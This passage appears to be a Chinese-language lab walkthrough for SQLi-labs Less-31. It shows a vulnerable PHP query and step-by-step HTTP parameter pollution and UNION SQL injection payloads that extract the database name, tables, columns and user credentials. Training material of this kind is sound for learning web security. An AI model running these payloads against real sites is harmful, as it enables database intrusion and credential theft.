@@ -1,0 +1,28 @@
+<hr>
+<h2 id="title-less31url-https-www-yuque-com-u29002979-ep2zrx-mynmykzw9pg87hpb"><a href="#title-less31url-https-www-yuque-com-u29002979-ep2zrx-mynmykzw9pg87hpb" class="headerlink" title="title: less31url: https://www.yuque.com/u29002979/ep2zrx/mynmykzw9pg87hpb"></a>title: less31<br>url: <a href="https://www.yuque.com/u29002979/ep2zrx/mynmykzw9pg87hpb">https://www.yuque.com/u29002979/ep2zrx/mynmykzw9pg87hpb</a></h2><pre><code class="bash">$id = &#39;&quot;&#39;.$id.&#39;&quot;&#39;;
+$sql=&quot;SELECT * FROM users WHERE id= ($id) LIMIT 0,1&quot;;
+</code></pre>
+<p>与Less29的区别为闭合方式为**双引号加括号”)  **</p>
+<p><code>?id=1&amp;id=0&quot;</code></p>
+<blockquote>
+<p><strong>Warning</strong>: mysql_fetch_array() expects parameter 1 to be resource, boolean given in <strong>E:\phpstudy_pro\WWW\sql.com\Less-31\index.php</strong> on line <strong>33</strong><br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“0””) LIMIT 0,1’ at line 1</p>
+</blockquote>
+<p>使用括号加单引号闭合”)</p>
+<p><code>?id=1&amp;id=0&quot;) union select 1,2,3--+</code><br>显示2，3是回显点</p>
+<p><a name="ohpIT"></a></p>
+<h1 id="HTTP参数污染"><a href="#HTTP参数污染" class="headerlink" title="HTTP参数污染"></a>HTTP参数污染</h1><p><a name="iQW9u"></a></p>
+<h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><blockquote>
+<p><strong>?id&#x3D;1&amp;id&#x3D;0”)</strong></p>
+</blockquote>
+<pre><code class="bash">查看当前数据库名称
+?id=1&#39;&amp;id=0&quot;) union select 1,2,(select database()) --+
+
+查看数据表名称
+?id=1&#39;&amp;id=0&quot;) union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database())--+
+
+爆破字段名称
+?id=1&amp;id=0&quot;) union select 1,2,(select group_concat(column_name)from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;)--+
+
+爆破字段内容 
+?id=1&amp;id=0&quot;) union select 1,2,(select group_concat(username,0x7e,password)from security.users )--+
+</code></pre>
